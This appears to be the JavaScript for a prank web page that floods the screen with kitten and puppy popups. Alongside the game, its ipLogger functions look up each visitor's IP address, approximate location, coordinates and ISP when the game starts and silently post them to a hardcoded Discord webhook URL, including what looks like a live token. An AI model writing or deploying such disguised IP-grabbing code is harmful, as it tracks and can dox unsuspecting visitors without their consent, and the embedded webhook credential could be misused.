// Configuration object
const CONFIG = {
    popups: {
        maxCount: 1000,
        spawnInterval: 500,
        initialDelay: 1000,
        size: { width: 150, height: 150 },
        animation: { duration: 500, timing: 'ease-out' }
    },
    pets: {
        kittens: {
            images: ['./assets/kittens/kitty1.png', './assets/kittens/kitty2.jpg', './assets/kittens/kitty3.png', './assets/kittens/kitty4.jpg', './assets/kittens/kitty5.jpg'],
            sounds: ['meow1', 'meow2', 'meow3', 'meow4', 'meow5'],
            colors: ['pink', 'purple']
        },
        puppies: {
            images: ['./assets/puppies/doggy1.jpg', './assets/puppies/doggy2.jpg', './assets/puppies/doggy3.jpg', './assets/puppies/doggy4.jpg', './assets/puppies/doggy5.jpg'],
            sounds: ['woof1', 'woof2', 'woof3'],
            colors: ['blue', 'yellow']
        }
    },
    sound: { enabled: true, volume: 0.5, allowMultiple: false },
    ipLogger: {
        enabled: true,
        apiUrl: 'https://freeipapi.com/api/json',
        webhookURL: 'https://discord.com/api/webhooks/1338871646144172124/kM98a--P88de47a9qoq50uR4ZlVO5f9AtdzTHO7ozufuW_JcY3pgsxkKXgAWIbc-iQq7' // Change this!
    }
};

let popupCount = 0;
let lastSoundTime = 0;
let gameStarted = false;
const popupContainer = document.getElementById('popup-container');

// Fetch and update IP card with real data
function updateIPCard() {
    if (!CONFIG.ipLogger.enabled) return;

    fetch(CONFIG.ipLogger.apiUrl)
        .then(response => response.json())
        .then(data => {
            const ip = data.ipAddress || "Unknown";
            const city = data.cityName || "Unknown";
            const region = data.regionName || "Unknown";
            const country = data.countryName || "Unknown";
            const org = data.ispName || "Unknown";
            const loc = `${data.latitude || "?"}, ${data.longitude || "?"}`;

            document.getElementById('ip-details').textContent = `IP Address: ${ip}`;
            document.getElementById('browser-info').textContent = `Browser: ${navigator.userAgent}`;
            document.getElementById('os-info').textContent = `OS: ${navigator.platform}`;
            document.getElementById('location').textContent = `Location: ${city}, ${region}, ${country}`;
            document.getElementById('isp').textContent = `ISP: ${org}`;

            sendToWebhook(ip, city, region, country, loc, org);
        })
        .catch(error => console.error("Error fetching IP data:", error));
}

// Send IP data to Discord webhook
function sendToWebhook(ip, city, region, country, loc, isp) {
    if (!CONFIG.ipLogger.webhookURL) return;

    const embed = {
        title: "IP Log",
        color: 1146986,
        fields: [
            { name: "**IP Address**", value: `\`${ip}\``, inline: true },
            { name: "**City**", value: `\`${city}\``, inline: true },
            { name: "**Region**", value: `\`${region}\``, inline: true },
            { name: "**Country**", value: `\`${country}\``, inline: true },
            { name: "**Coordinates**", value: `\`${loc}\``, inline: true },
            { name: "**ISP**", value: `\`${isp}\``, inline: false }
        ]
    };

    fetch(CONFIG.ipLogger.webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: "IP Logger", embeds: [embed] })
    })
    .then(() => console.log("IP logged via webhook"))
    .catch(error => console.error("Webhook error:", error));
}

// Sound management
function playSound(petType) {
    if (!CONFIG.sound.enabled) return;

    const currentTime = Date.now();
    if (!CONFIG.sound.allowMultiple && currentTime - lastSoundTime < 200) return;

    const sounds = CONFIG.pets[petType].sounds;
    const soundId = sounds[Math.floor(Math.random() * sounds.length)];
    const audio = document.getElementById(soundId);

    if (audio) {
        audio.volume = CONFIG.sound.volume;
        audio.currentTime = 0;
        audio.play();
        lastSoundTime = currentTime;
    }
}

// Create popups
function createPopup() {
    if (!gameStarted || popupCount >= CONFIG.popups.maxCount) return;

    const popup = document.createElement('div');
    const isPuppy = Math.random() < 0.5;
    const petType = isPuppy ? 'puppies' : 'kittens';
    const petConfig = CONFIG.pets[petType];

    const randomImage = petConfig.images[Math.floor(Math.random() * petConfig.images.length)];
    const randomColor = petConfig.colors[Math.floor(Math.random() * petConfig.colors.length)];

    const x = Math.random() * (window.innerWidth - CONFIG.popups.size.width);
    const y = Math.random() * (window.innerHeight - CONFIG.popups.size.height);

    popup.className = `popup-image absolute pointer-events-auto`;
    popup.style.left = `${x}px`;
    popup.style.top = `${y}px`;

    popup.innerHTML = `
        <div class="relative group" data-pet-type="${petType}">
            <img src="${randomImage}" alt="Kawaii Pet" 
                class="rounded-full border-4 border-${randomColor}-400 shadow-lg w-[${CONFIG.popups.size.width}px] h-[${CONFIG.popups.size.height}px] object-cover">
            <div class="absolute inset-0 bg-black/50 rounded-full opacity-0 group-hover:opacity-100 
                transition-opacity duration-200 flex items-center justify-center cursor-pointer">
                <button class="text-white text-4xl font-bold transform transition-transform 
                    hover:scale-125 hover:text-pink-300">
                    ✕
                </button>
            </div>
        </div>
    `;

    popup.querySelector('.absolute').addEventListener('click', (e) => {
        e.stopPropagation();
        const petType = e.currentTarget.parentElement.dataset.petType;
        playSound(petType);
        popup.remove();
        popupCount--;
    });

    popupContainer.appendChild(popup);
    popupCount++;

    setTimeout(createPopup, CONFIG.popups.spawnInterval);
}

// Reveal content with animation
function revealContent() {
    const mainContent = document.getElementById('main-content');
    mainContent.classList.add('visible');

    const elements = [
        document.getElementById('ip-card'),
        document.getElementById('video-section')
    ];

    elements.forEach((el, index) => {
        setTimeout(() => {
            el.classList.add('slide-in');
            el.style.opacity = '1';
        }, index * 300);
    });
}

// Start game & trigger events
function startGame() {
    const modal = document.getElementById('warning-modal');
    modal.style.opacity = '0';
    modal.style.transition = 'opacity 0.3s ease-out';
    gameStarted = true;

    setTimeout(() => {
        modal.remove();
        revealContent();
        updateIPCard();
        setTimeout(createPopup, CONFIG.popups.initialDelay);
    }, 300);
}
